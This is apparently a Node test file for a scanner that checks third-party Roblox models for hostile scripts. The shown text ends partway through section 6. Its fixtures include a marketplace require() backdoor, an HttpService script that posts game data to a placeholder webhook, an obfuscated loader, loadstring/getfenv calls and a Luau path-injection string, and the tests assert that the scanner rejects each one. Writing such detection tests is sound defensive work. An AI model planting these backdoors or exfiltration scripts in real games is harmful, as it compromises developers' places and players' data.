// THE SAFETY SUITE for inserted third-party geometry.
//
// WHAT THIS FILE IS. `asset-qc.test.mjs` pins the gate that runs BEFORE anything is fetched —
// provenance, type, price, creator. This file pins what happens AFTER something lands in a
// customer's place: the script scanner, the style ranker, and the broker that sequences them.
// The scanner is the security-critical half and gets the most tests, because it is the last thing
// standing between a stranger's Luau and someone's game.
//
// THE FIVE FIXTURES the brief names are all here and all named in their test titles: a clean model,
// a model with a plain script, a `require(12345)` backdoor, an obfuscated blob, and an HTTP-calling
// script. They are exercised twice — once through `scanScriptSource` directly, and once end-to-end
// through `brokerAsset` against a fake Studio, so the policy is proven at the unit AND at the
// pipeline level.
//
// §6 IS THE ONE THAT WOULD HAVE CAUGHT THE GAP. Everything above proved the scanner works; none of
// it proved the scanner RUNS. The scanner shipped with 47 passing tests and zero call sites, while
// the live `insert_asset` inserted on the metadata gate alone and never read the place back. So §6
// drives the real tool through the real dispatcher: a green §1-§5 with a rewired §6 is the exact
// state this file used to be in, and now it fails.
//
// NO NETWORK. Every function under test takes an injected `fetchImpl` or an injected bridge, and
// §6 replaces `globalThis.fetch` at module scope for the tool path. Two dedicated tests assert that
// nothing reached apis.roblox.com for real — the fakes record every URL they are asked for.
//
// Run: node --test packages/evals/src/asset-safety.test.mjs
import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const HERE = dirname(fileURLToPath(import.meta.url));
const WORKER = join(HERE, '..', '..', '..', 'apps', 'worker');
const dir = mkdtempSync(join(tmpdir(), 'golem-asset-safety-'));
const out = join(dir, 'assets.mjs');
// assets.ts deliberately has no runtime imports, so a plain transpile is the whole build.
execFileSync(join(WORKER, 'node_modules', '.bin', 'esbuild'), [join(WORKER, 'src', 'assets.ts'), '--format=esm', '--outfile=' + out], { stdio: 'pipe', cwd: WORKER });

const A = await import(out);
// tools.ts is the LIVE call site. The scanner above is only worth testing because something calls
// it, so §6 drives the real `insert_asset` through the real dispatcher rather than re-testing the
// primitives it composes. This needs --bundle; assets.ts above does not, and that difference is the
// whole reason the two are built separately.
const toolsOut = join(dir, 'tools.mjs');
execFileSync(join(WORKER, 'node_modules', '.bin', 'esbuild'), [join(WORKER, 'src', 'tools.ts'), '--bundle', '--format=esm', '--target=es2022', '--outfile=' + toolsOut], { stdio: 'pipe', cwd: WORKER });
const T = await import(toolsOut);
const {
  scanScriptSource,
  scanInsertedHierarchy,
  scanToText,
  worseSeverity,
  SCAN_LIMITS,
  scoreAssetStyle,
  rankAssetsByStyle,
  styleGateBlocks,
  BRIGHT_SIMULATOR,
  describeAssetRequest,
  inspectCreator,
  isSafeLuauPath,
  buildNormaliseLuau,
  parseNormaliseResult,
  summariseTree,
  brokerAsset,
  BROKER_STEPS,
} = A;

// ==============================================================================================
// Fixtures — the five models the brief names.
// ==============================================================================================

/** A plain gameplay script. Nothing malicious in it; it is still Luau, so it is still removed. */
const PLAIN_SCRIPT = `-- spins the model slowly
local part = script.Parent
while true do
	part.CFrame = part.CFrame * CFrame.Angles(0, 0.01, 0)
	task.wait()
end
`;

/** The classic Roblox backdoor: a module pulled off the marketplace at runtime. */
const REQUIRE_BACKDOOR = `local a = require(3163717554)
a.load(game, "owner")
`;

/** The same backdoor with the id hidden behind a variable — still unresolvable, still refused. */
const REQUIRE_INDIRECT = `local id = 316 .. 3717554
require(tonumber(id))
`;

/** Exfiltration: reads the place and posts it somewhere. */
const HTTP_SCRIPT = `local HttpService = game:GetService("HttpService")
local payload = HttpService:JSONEncode({ place = game.PlaceId })
HttpService:PostAsync("https://example-collector.invalid/api/webhooks/abc", payload)
`;

/** An obfuscated blob: one enormous line, escapes, concat chains, a base64-shaped payload. */
const OBFUSCATED = [
  'local v0=function(...)return(...)end;',
  'local s="' + '\\x68\\x74\\x74\\x70'.repeat(40) + '";',
  'local b="' + 'QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVph'.repeat(6) + '";',
  'local n=' + Array.from({ length: 12 }, (_, i) => `"p${i}"`).join('..') + ';',
].join('');

const cleanModel = { rootPath: 'game.Workspace.Rock', scripts: [], instanceClasses: ['Model', 'MeshPart', 'MeshPart'] };

// ==============================================================================================
// 1. The scanner — per script
// ==============================================================================================

test('A CLEAN MODEL IS THE ONLY THING THAT COMES BACK auto-insertable', () => {
  const scan = scanInsertedHierarchy(cleanModel);
  assert.equal(scan.verdict, 'clean');
  assert.equal(scan.autoInsertable, true);
  assert.equal(scan.scriptCount, 0);
  assert.deepEqual(scan.removePaths, []);
  assert.equal(scan.severity, 'none');
});

test('A MODEL WITH A PLAIN, HARMLESS SCRIPT IS STILL NEVER AUTO-INSERTED', () => {
  const scan = scanInsertedHierarchy({
    rootPath: 'game.Workspace.Spinner',
    scripts: [{ path: 'game.Workspace.Spinner.Spin', className: 'Script', source: PLAIN_SCRIPT }],
    instanceClasses: ['Model', 'Part', 'Script'],
  });
  assert.equal(scan.autoInsertable, false, 'a script of any kind blocks auto-insertion');
  assert.equal(scan.verdict, 'stripped');
  assert.deepEqual(scan.removePaths, ['game.Workspace.Spinner.Spin']);
  // Nothing in it is actually malicious, so it must NOT be escalated to a whole-asset discard.
  assert.equal(scan.severity, 'medium');
  assert.equal(scan.scripts[0].findings.every((f) => f.code === 'script_present'), true);
});

test('THE require(12345) BACKDOOR is critical, names itself, and quotes the line', () => {
  const s = scanScriptSource('game.Workspace.Tree.Main', 'Script', REQUIRE_BACKDOOR);
  const f = s.findings.find((x) => x.code === 'require_asset_id');
  assert.ok(f, 'the asset-id require must be found');
  assert.equal(f.severity, 'critical');
  assert.equal(f.line, 1);
  assert.match(f.excerpt, /require\(3163717554\)/);
  assert.match(f.message, /backdoor/i);
  assert.equal(s.severity, 'critical');
});

test('a require whose id is assembled at runtime is still refused — ambiguity is not a pass', () => {
  const s = scanScriptSource('game.Workspace.X.M', 'ModuleScript', REQUIRE_INDIRECT);
  const codes = s.findings.map((f) => f.code);
  assert.ok(codes.includes('require_dynamic'), 'an unresolvable require must be flagged');
  assert.equal(s.severity, 'critical');
});

test('a legitimate require of the asset\'s own tree is not itself a risk finding', () => {
  const s = scanScriptSource('game.Workspace.Kit.Init', 'ModuleScript', 'local cfg = require(script.Parent.Config)\nreturn cfg\n');
  assert.deepEqual(s.findings.map((f) => f.code), ['script_present'], 'path-shaped requires add no extra risk');
  // ...but it is still Luau, so it is still removed.
  assert.equal(s.action, 'remove');
});

test('AN HTTP-CALLING SCRIPT is caught by service, by call, and by URL', () => {
  const s = scanScriptSource('game.Workspace.Chair.Report', 'Script', HTTP_SCRIPT);
  const codes = new Set(s.findings.map((f) => f.code));
  assert.ok(codes.has('http_service'), 'HttpService use must be flagged');
  assert.ok(codes.has('url_literal'), 'the hard-coded URL must be flagged');
  assert.equal(s.severity, 'critical');
  const webhook = s.findings.find((f) => f.code === 'url_literal' && f.severity === 'critical');
  assert.ok(webhook, 'a /api/webhooks/ URL is the exfiltration endpoint and is critical, not merely high');
});

test('AN OBFUSCATED BLOB is caught on shape alone, with no vocabulary to match on', () => {
  const s = scanScriptSource('game.Workspace.Thing.Loader', 'Script', OBFUSCATED);
  const obf = s.findings.filter((f) => f.code === 'obfuscation');
  assert.ok(obf.length >= 2, `expected several shape signals, got ${obf.map((f) => f.message).join(' | ')}`);
  assert.equal(s.severity, 'critical');
  assert.ok(obf.some((f) => /characters/.test(f.message)), 'the packed line must be reported');
  assert.ok(obf.some((f) => /escapes/.test(f.message)), 'the escape ratio must be reported');
});

test('loadstring / getfenv / setfenv are critical wherever they appear', () => {
  for (const line of ['loadstring(x)()', 'getfenv(1).print = nil', 'setfenv(f, {})']) {
    const s = scanScriptSource('p', 'Script', line);
    assert.ok(s.findings.some((f) => f.code === 'dynamic_code' && f.severity === 'critical'), line);
  }
});

test('a script that reaches for ServerScriptService is critical — that is where a backdoor installs', () => {
  const s = scanScriptSource('p', 'Script', 'script.Parent = game:GetService("ServerScriptService")');
  const codes = new Set(s.findings.map((f) => f.code));
  assert.ok(codes.has('server_container'));
  assert.ok(codes.has('reparent_self'));
  assert.equal(s.severity, 'critical');
});

test('remotes and purchase prompts are flagged in an asset that should be inert', () => {
  const s = scanScriptSource('p', 'LocalScript', 'local r = Instance.new("RemoteEvent")\nMarketplaceService:PromptGamePassPurchase(p, 1)\n');
  const codes = new Set(s.findings.map((f) => f.code));
  assert.ok(codes.has('remote_traffic'));
  assert.ok(codes.has('marketplace_prompt'));
});

test('AN UNREADABLE SOURCE IS THE WORST CASE, NOT THE EMPTY ONE', () => {
  const s = scanScriptSource('game.Workspace.X.Hidden', 'Script', null);
  assert.equal(s.severity, 'critical');
  assert.equal(s.findings[0].code, 'unreadable');
  const scan = scanInsertedHierarchy({ rootPath: 'game.Workspace.X', scripts: [{ path: 'game.Workspace.X.Hidden', className: 'Script', source: null }] });
  assert.equal(scan.verdict, 'reject', 'code nobody can read means the whole asset goes');
});

test('an empty source is NOT the same as an unreadable one', () => {
  const s = scanScriptSource('p', 'Script', '');
  assert.equal(s.severity, 'medium');
  assert.equal(s.findings.some((f) => f.code === 'unreadable'), false);
});

// ==============================================================================================
// 2. The scanner — hierarchy level and the reject/strip boundary
// ==============================================================================================

test('any critical finding escalates from "strip the script" to "discard the asset"', () => {
  const scan = scanInsertedHierarchy({
    rootPath: 'game.Workspace.Tree',
    scripts: [{ path: 'game.Workspace.Tree.Main', className: 'Script', source: REQUIRE_BACKDOOR }],
    instanceClasses: ['Model', 'Part', 'Script'],
  });
  assert.equal(scan.verdict, 'reject');
  assert.equal(scan.autoInsertable, false);
  assert.match(scan.reasons.join(' '), /not fixed by deleting a script/);
});

test('a RemoteEvent with no script at all is still flagged — nothing needs Luau to be suspicious', () => {
  const scan = scanInsertedHierarchy({ rootPath: 'game.Workspace.Crate', scripts: [], instanceClasses: ['Model', 'Part', 'RemoteEvent'] });
  assert.equal(scan.verdict, 'stripped');
  assert.equal(scan.autoInsertable, false);
  assert.ok(scan.findings.some((f) => f.code === 'remote_traffic'));
});

test('an unenumerable hierarchy is rejected — unknown contents are never treated as empty', () => {
  const scan = scanInsertedHierarchy({ rootPath: 'game.Workspace.Big', scripts: [], enumerationFailed: true });
  assert.equal(scan.verdict, 'reject');
  assert.ok(scan.findings.some((f) => f.code === 'unreadable'));
});

test('more scripts than the scan cap is refused on count alone, not partially cleared', () => {
  const scripts = Array.from({ length: SCAN_LIMITS.maxScripts + 5 }, (_, i) => ({ path: `game.Workspace.M.S${i}`, className: 'Script', source: PLAIN_SCRIPT }));
  const scan = scanInsertedHierarchy({ rootPath: 'game.Workspace.M', scripts });
  assert.equal(scan.verdict, 'reject');
  assert.equal(scan.scripts.length, SCAN_LIMITS.maxScripts);
});

test('an enormous source is refused rather than partially scanned', () => {
  const s = scanScriptSource('p', 'Script', 'print("x")\n'.repeat(Math.ceil(SCAN_LIMITS.maxSourceChars / 10) + 100));
  assert.equal(s.severity, 'critical');
  assert.ok(s.findings.some((f) => /only the first/.test(f.message)));
});

test('the scanner never throws, whatever it is handed', () => {
  for (const junk of ['\u0000\u0001\u0002', '\\', '((((((', 'require(', 'ÿ'.repeat(5000)]) {
    assert.doesNotThrow(() => scanScriptSource('p', 'Script', junk));
  }
  assert.doesNotThrow(() => scanInsertedHierarchy({ rootPath: '', scripts: [] }));
});

test('excerpts are capped and stripped of control characters, so a scan is always safe to display', () => {
  const s = scanScriptSource('p', 'Script', 'require(1234567) --' + '\u0007A'.repeat(500));
  for (const f of s.findings) {
    assert.ok(f.excerpt.length <= SCAN_LIMITS.excerptChars, `excerpt was ${f.excerpt.length} chars`);
    assert.equal(/[\u0000-\u001f\u007f]/.test(f.excerpt), false, 'control characters must be stripped');
  }
});

test('scanToText renders every finding and never leaks a full source', () => {
  const scan = scanInsertedHierarchy({ rootPath: 'game.Workspace.T', scripts: [{ path: 'game.Workspace.T.S', className: 'Script', source: HTTP_SCRIPT }] });
  const text = scanToText(scan);
  assert.match(text, /REJECT/);
  assert.match(text, /http_service/);
  assert.ok(text.length < 4000, 'a scan rendering has to fit in a tool result');
});

test('worseSeverity is a total order, so roll-ups cannot disagree with themselves', () => {
  assert.equal(worseSeverity('low', 'critical'), 'critical');
  assert.equal(worseSeverity('high', 'medium'), 'high');
  assert.equal(worseSeverity('medium', 'medium'), 'medium');
});

// ==============================================================================================
// 3. The style ranker (§41)
// ==============================================================================================

const LOWPOLY_CHAIR = {
  assetId: 1,
  name: 'Low Poly Chair',
  triangles: 320,
  hasTexture: false,
  materials: ['SmoothPlastic'],
  dominantColours: [[0.78, 0.85, 0.34], [0.48, 0.73, 0.29]],
  boundsStuds: [3, 4, 3],
  partCount: 5,
  intent: 'chair',
};

const PHOTOREAL_CHAIR = {
  assetId: 2,
  name: 'Photorealistic PBR Armchair 4K Scanned',
  triangles: 48000,
  hasTexture: true,
  textureResolution: 4096,
  materials: ['Marble', 'Glass'],
  dominantColours: [[0.24, 0.22, 0.21], [0.31, 0.29, 0.28]],
  boundsStuds: [3, 4, 3],
  partCount: 1,
  intent: 'chair',
};

test('THE HEADLINE: a photoreal PBR chair loses to a low-poly one in a bright simulator', () => {
  const ranked = rankAssetsByStyle([PHOTOREAL_CHAIR, LOWPOLY_CHAIR], BRIGHT_SIMULATOR);
  assert.equal(ranked[0].candidate.assetId, LOWPOLY_CHAIR.assetId, 'the low-poly chair must rank first');
  assert.equal(ranked[0].score.verdict, 'strong');
  assert.equal(ranked[1].score.verdict, 'reject');
  assert.ok(ranked[0].score.total > ranked[1].score.total + 30, 'the separation must be wide, not marginal');
});

test('the photoreal chair fails DETERMINISTICALLY — no model call is needed to reject it', () => {
  const score = scoreAssetStyle(PHOTOREAL_CHAIR, BRIGHT_SIMULATOR);
  const blocks = styleGateBlocks(score);
  assert.ok(blocks.length >= 3, `expected several hard fails, got ${blocks.join(' | ')}`);
  assert.ok(blocks.some((b) => /texture/i.test(b)), 'a texture map in a flat-shaded style is a hard fail');
  assert.ok(blocks.some((b) => /Marble|Glass|realistic material/i.test(b)), 'a realistic material is an automatic fail (§9)');
  assert.ok(blocks.some((b) => /triangle/i.test(b)), '48k triangles for a prop is a hard fail');
});

test('a desaturated or dark asset is a hard fail — the category has no muted palette and no dark mode', () => {
  const grey = scoreAssetStyle({ ...LOWPOLY_CHAIR, dominantColours: [[0.35, 0.35, 0.36]] }, BRIGHT_SIMULATOR);
  assert.ok(grey.hardFails.some((f) => /saturation/i.test(f)));
  const dark = scoreAssetStyle({ ...LOWPOLY_CHAIR, dominantColours: [[0.05, 0.12, 0.06]] }, BRIGHT_SIMULATOR);
  assert.ok(dark.hardFails.some((f) => /brightness|dark/i.test(f)));
});

test('an asset lying on its side fails scale outright', () => {
  const fallen = scoreAssetStyle({ ...LOWPOLY_CHAIR, intent: 'tree', boundsStuds: [40, 12, 40], triangles: 900 }, BRIGHT_SIMULATOR);
  assert.ok(fallen.hardFails.some((f) => /lying on its side/i.test(f)));
  assert.equal(fallen.verdict, 'reject');
});

test('hard-failed candidates always sort last, even when their weighted total is respectable', () => {
  const mediocre = { assetId: 3, name: 'plain block', triangles: 3900, hasTexture: false, materials: ['Plastic'], boundsStuds: [3, 4, 3], intent: 'chair', dominantColours: [[0.6, 0.78, 0.3]] };
  const ranked = rankAssetsByStyle([PHOTOREAL_CHAIR, mediocre], BRIGHT_SIMULATOR);
  assert.equal(ranked[0].candidate.assetId, 3);
  assert.equal(ranked[1].candidate.assetId, 2);
});

test('unknowns score 0.5 and are REPORTED as unknown — never silently treated as good', () => {
  const bare = scoreAssetStyle({ assetId: 9, name: 'thing' }, BRIGHT_SIMULATOR);
  assert.equal(bare.hardFails.length, 0, 'nothing measured means nothing can hard-fail');
  assert.ok(bare.confidence < 0.4, `confidence should be low, was ${bare.confidence}`);
  assert.ok(bare.axes.some((a) => /unknown|no dominant|no bounding|not (?:reported|measured)/i.test(a.reason)));
  assert.notEqual(bare.verdict, 'strong', 'an unmeasured asset is never "strong"');
});

test('every axis carries a weight, the weights sum to 1, and every axis states a reason', () => {
  const score = scoreAssetStyle(LOWPOLY_CHAIR, BRIGHT_SIMULATOR);
  const sum = score.axes.reduce((a, x) => a + x.weight, 0);
  assert.ok(Math.abs(sum - 1) < 1e-9, `weights summed to ${sum}`);
  for (const a of score.axes) {
    assert.ok(a.reason.length > 10, `${a.axis} has no reason`);
    assert.ok(a.score >= 0 && a.score <= 1, `${a.axis} out of range`);
  }
});

test('the calibrated target is the style spec: its palette is the §1 environment table', () => {
  assert.equal(BRIGHT_SIMULATOR.flatShaded, true);
  assert.ok(BRIGHT_SIMULATOR.palette.length >= 8);
  // #5FC94A, the grass row of the table, in Color3 0..1.
  const grass = BRIGHT_SIMULATOR.palette.find((c) => Math.abs(c[0] - 0x5f / 255) < 1e-9 && Math.abs(c[1] - 0xc9 / 255) < 1e-9);
  assert.ok(grass, 'the grass hex from ROBLOX-STYLE-SPEC §1 must be in the palette');
  assert.ok(BRIGHT_SIMULATOR.bannedMaterials.includes('Marble'));
});

// ==============================================================================================
// 4. Pipeline plumbing: describe, creator, path safety, normalisation, tree
// ==============================================================================================

test('describe strips filler and infers the decision-table row', () => {
  const d = describeAssetRequest({ description: 'can you please add a nice low poly oak tree for my park' });
  assert.equal(d.need, 'foliage');
  assert.equal(/\b(?:can|you|please|a|for|my)\b/.test(d.query), false, `filler survived: ${d.query}`);
  assert.match(d.query, /tree/);
});

test('an untrusted creator is not acceptable, and Roblox itself is trusted by construction', () => {
  const base = { creator: { id: 55, name: 'someone', isVerifiedCreator: false }, isEndorsed: false, upVotePercent: 90, voteCount: 40 };
  assert.equal(inspectCreator(base).acceptable, false);
  assert.equal(inspectCreator({ ...base, creator: { id: 1, name: 'Roblox', isVerifiedCreator: false } }).trust, 'roblox');
  assert.equal(inspectCreator({ ...base, creator: { ...base.creator, isVerifiedCreator: true } }).trust, 'verified');
  assert.equal(inspectCreator({ ...base, isEndorsed: true }).trust, 'endorsed');
});

test('LUAU PATH INJECTION IS FAILED CLOSED — a hostile path yields no code at all', () => {
  assert.equal(isSafeLuauPath('game.Workspace.Tree'), true);
  assert.equal(isSafeLuauPath('game.Workspace["Oak Tree"]'), true);
  for (const evil of [
    'game.Workspace["a"] end; loadstring("x")() --',
    'game.Workspace["a\\"]"]',
    'game.Workspace\nprint(1)',
    'game.Workspace["a`b"]',
    '',
  ]) {
    assert.equal(isSafeLuauPath(evil), false, `should have been refused: ${JSON.stringify(evil)}`);
    assert.equal(buildNormaliseLuau({ path: evil, scale: 1, position: null, reasons: [] }), null);
  }
});

test('normalisation refuses absurd scales and non-finite positions rather than emitting them', () => {
  const p = { path: 'game.Workspace.T', reasons: [] };
  assert.equal(buildNormaliseLuau({ ...p, scale: 0, position: null }), null);
  assert.equal(buildNormaliseLuau({ ...p, scale: 1e9, position: null }), null);
  assert.equal(buildNormaliseLuau({ ...p, scale: 1, position: [0, NaN, 0] }), null);
  const good = buildNormaliseLuau({ ...p, scale: 2.5, position: [10, 0, -4] });
  assert.match(good, /ScaleTo\(2\.5000\)/);
  assert.match(good, /PivotTo\(CFrame\.new\(10\.000, 0\.000, -4\.000\)\)/);
  assert.match(good, /Anchored = true/);
});

test('the normalisation report survives the wrappers run_code puts around it', () => {
  const payload = '{"anchored":7,"scaled":2.0,"size":[3,4,3],"pos":[0,2,0]}';
  for (const wrapped of [payload, { result: payload }, { result: { t: 'string', v: payload } }, { data: { result: payload } }]) {
    const parsed = parseNormaliseResult(wrapped);
    assert.equal(parsed.anchored, 7);
    assert.deepEqual(parsed.size, [3, 4, 3]);
  }
  assert.equal(parseNormaliseResult('{"error":"target not found"}'), null);
  assert.equal(parseNormaliseResult('not json'), null);
});

test('summariseTree measures the bounding box and notices a truncated walk', () => {
  const tree = { root: { name: 'M', class: 'Model', children: [
    { name: 'A', class: 'Part', pos: [0, 2, 0], size: [4, 4, 4] },
    { name: 'B', class: 'Part', pos: [10, 2, 0], size: [2, 2, 2] },
  ] } };
  const s = summariseTree(tree);
  assert.deepEqual(s.classes, ['Model', 'Part', 'Part']);
  assert.deepEqual(s.bounds, [13, 4, 4]);
  assert.equal(s.truncated, false);
  assert.equal(summariseTree({ root: { name: 'M', class: 'Model', moreChildren: 40 } }).truncated, true);
});

// ==============================================================================================
// 5. The broker end to end, against a fake Studio and a fake Creator Store
// ==============================================================================================

const HIT = (id, name) => ({ asset: { id, name, typeId: 40 }, creator: { id: 1, name: 'Roblox' }, fiatProduct: { isFree: true } });

const DETAILS = (id, name, extra = {}) => ({
  data: [
    {
      asset: { id, name, typeId: 40, hasScripts: false, scriptCount: 0, visibilityStatus: 1, capabilities: {}, modelTechnicalDetails: { objectMeshSummary: { triangles: 800, vertices: 500 } }, ...extra },
      creator: { id: 1, name: 'Roblox', isVerifiedCreator: true },
      voting: { upVotePercent: 96, voteCount: 400 },
      fiatProduct: { isFree: true, purchasable: true },
    },
  ],
});

/** Records every URL asked for, so a test can prove nothing real was contacted. */
function fakeStore(details = DETAILS(101, 'Low Poly Crate')) {
  const urls = [];
  const fetchImpl = async (url) => {
    urls.push(url);
    if (url.includes('marketplace') || url.includes('assets:search')) {
      return { ok: true, status: 200, json: async () => ({ data: [HIT(101, 'Low Poly Crate')] }) };
    }
    return { ok: true, status: 200, json: async () => details };
  };
  return { fetchImpl, urls };
}

/**
 * A fake Studio. `scripts` is the hierarchy the plugin will report AFTER insertion — i.e. what the
 * metadata gate could not see. Deletions actually mutate it, so `verify` is a real re-read.
 */
function fakeStudio({ scripts = [], classes = ['Model', 'MeshPart'], failOn = null } = {}) {
  const state = { scripts: scripts.slice(), deleted: [], calls: [] };
  const bridge = {
    async execStudioOp(op) {
      state.calls.push(op.op);
      if (failOn === op.op) return { ok: false, error: `fake failure on ${op.op}` };
      switch (op.op) {
        case 'insert_asset':
          return { ok: true, data: { inserted: ['game.Workspace.Crate'] } };
        case 'get_tree':
          return { ok: true, data: { root: { name: 'Crate', class: classes[0], pos: [0, 2, 0], size: [4, 4, 4], children: classes.slice(1).map((c, i) => ({ name: `C${i}`, class: c })) } } };
        case 'list_scripts':
          return { ok: true, data: { scripts: state.scripts.map((s) => ({ path: s.path, class: s.className })) } };
        case 'read_script': {
          const found = state.scripts.find((s) => s.path === op.path);
          return found && found.source !== null ? { ok: true, data: { source: found.source } } : { ok: false, error: 'unreadable' };
        }
        case 'delete_instances':
          state.deleted.push(...op.paths);
          state.scripts = state.scripts.filter((s) => !op.paths.includes(s.path) && !op.paths.some((p) => s.path.startsWith(p + '.')));
          return { ok: true, data: { deleted: op.paths } };
        case 'run_code':
          return { ok: true, data: { result: '{"anchored":3,"scaled":0,"size":[4,4,4],"pos":[0,2,0]}' } };
        default:
          return { ok: true, data: {} };
      }
    },
  };
  return { bridge, state };
}

test('THE HAPPY PATH: a clean asset walks the whole pipeline in order and ends verified', async () => {
  const store = fakeStore();
  const studio = fakeStudio();
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, true, r.summary);
  const order = r.steps.map((s) => s.step);
  assert.deepEqual(order, BROKER_STEPS.slice(), 'every step must run, in the declared order');
  assert.equal(r.scan.verdict, 'clean');
  assert.equal(r.chosen.assetId, 101);
  // The order that matters: the hierarchy is never read before it exists, and never after it is used.
  assert.ok(studio.state.calls.indexOf('insert_asset') < studio.state.calls.indexOf('list_scripts'));
});

test('A BACKDOORED MODEL THAT PASSED THE METADATA GATE IS DELETED, WHOLE, AFTER INSERTION', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Main', className: 'Script', source: REQUIRE_BACKDOOR }], classes: ['Model', 'MeshPart', 'Script'] });
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.aborted.step, 'scan_scripts');
  assert.equal(r.scan.verdict, 'reject');
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate'], 'the whole asset goes, not just the script');
  assert.match(r.summary, /backdoor/i);
});

test('a plain script is stripped and the place is PROVEN clean by re-reading it', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Spin', className: 'Script', source: PLAIN_SCRIPT }], classes: ['Model', 'MeshPart', 'Script'] });
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, true, r.summary);
  assert.deepEqual(r.removed, ['game.Workspace.Crate.Spin']);
  assert.equal(r.scan.verdict, 'stripped');
  // verify re-lists AFTER the delete; the fake actually removed the row, so this is a real proof.
  assert.equal(studio.state.calls.filter((c) => c === 'list_scripts').length, 2);
});

test('an HTTP-calling script that survives the metadata gate causes a whole-asset discard', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Beacon', className: 'Script', source: HTTP_SCRIPT }] });
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate']);
});

test('a script whose source cannot be read discards the asset rather than assuming it is fine', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ scripts: [{ path: 'game.Workspace.Crate.Hidden', className: 'Script', source: null }] });
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.scan.verdict, 'reject');
  assert.deepEqual(studio.state.deleted, ['game.Workspace.Crate']);
});

test('a failed post-removal listing is a refusal, because the place cannot be proven clean', async () => {
  const store = fakeStore();
  const studio = fakeStudio({ failOn: 'list_scripts' });
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.ok(['scan_scripts', 'verify'].includes(r.aborted.step), r.aborted.step);
});

test('a script-bearing asset never reaches Studio when the METADATA already says so', async () => {
  const store = fakeStore(DETAILS(101, 'Crate', { hasScripts: true, scriptCount: 2 }));
  const studio = fakeStudio();
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.aborted.step, 'select');
  assert.equal(studio.state.calls.length, 0, 'nothing may touch the place when the gate already refused');
  assert.equal(r.considered[0].verdict, 'fail_has_scripts');
});

test('the style gate can refuse a perfectly safe asset — valid is not the same as right', async () => {
  const store = fakeStore(DETAILS(101, 'Photorealistic PBR Scanned Crate 4K', { modelTechnicalDetails: { objectMeshSummary: { triangles: 90000, vertices: 60000 } } }));
  const studio = fakeStudio();
  const r = await brokerAsset({}, { description: 'a crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.aborted.step, 'select');
  assert.equal(r.considered[0].verdict, 'pass', 'it passed every SAFETY assertion');
  assert.equal(r.considered[0].style.verdict, 'reject', 'and still lost on style');
  assert.equal(studio.state.calls.length, 0);
});

test('the decision table has the last word: a need it never routes to the store is refused first', async () => {
  const store = fakeStore();
  const studio = fakeStudio();
  const r = await brokerAsset({}, { description: 'a big house', need: 'building' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.aborted.step, 'describe');
  assert.equal(store.urls.length, 0, 'no request may be made for a need the table refuses');
});

test('dryRun stops at select and never touches the place', async () => {
  const store = fakeStore();
  const studio = fakeStudio();
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl, dryRun: true });
  assert.equal(r.ok, true);
  assert.equal(studio.state.calls.length, 0);
  assert.deepEqual(r.steps.map((s) => s.step).slice(-1), ['select']);
});

test('NO NETWORK: every URL the broker asked for went to the injected fake', async () => {
  const store = fakeStore();
  const studio = fakeStudio();
  await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, studio.bridge, { fetchImpl: store.fetchImpl });
  assert.ok(store.urls.length > 0, 'the broker must have gone through the injected fetch');
  for (const u of store.urls) assert.match(u, /^https:\/\/apis\.roblox\.com\//, u);
});

test('the broker never throws — a Studio that fails every op is a refusal with an audit trail', async () => {
  const store = fakeStore();
  const bridge = { async execStudioOp() { return { ok: false, error: 'studio is on fire' }; } };
  const r = await brokerAsset({}, { description: 'a low poly crate', intent: 'crate' }, bridge, { fetchImpl: store.fetchImpl });
  assert.equal(r.ok, false);
  assert.equal(r.aborted.step, 'insert');
  assert.ok(r.steps.length >= 6, 'the trail up to the failure must survive');
  assert.match(r.summary, /REFUSED at insert/);
});

// ==============================================================================================
// 6. The LIVE call site: tools.insert_asset
//
// Everything above proves the scanner works. None of it proved the scanner RUNS. Until this
// section existed, `brokerAsset` and `scanInsertedHierarchy` had zero call sites and `insert_asset`
// inserted on the metadata gate alone — so a hostile asset whose metadata lied was inserted, kept,
// and never read back. These tests drive the real dispatcher, so they fail the day the wiring is
// removed rather than the day the scanner is.
//
// NO NETWORK: `globalThis.fetch` is replaced at module scope, before the first test, and the
// closing test pins every host it was asked for.
// ==============================================================================================

/** Every URL the worker asked for, for the whole section. Never reset. */
const fetched = [];
let respond = () => {
  throw new Error('a test made a request without configuring a stub');
};
globalThis.fetch = async (url) => {
  fetched.push(String(url));
  return respond(String(url));
};

/**
 * A details payload the metadata gate accepts, with every group overridable and any field
 * removable — `omit` is how the "the endpoint stopped reporting hasScripts" case is expressed,
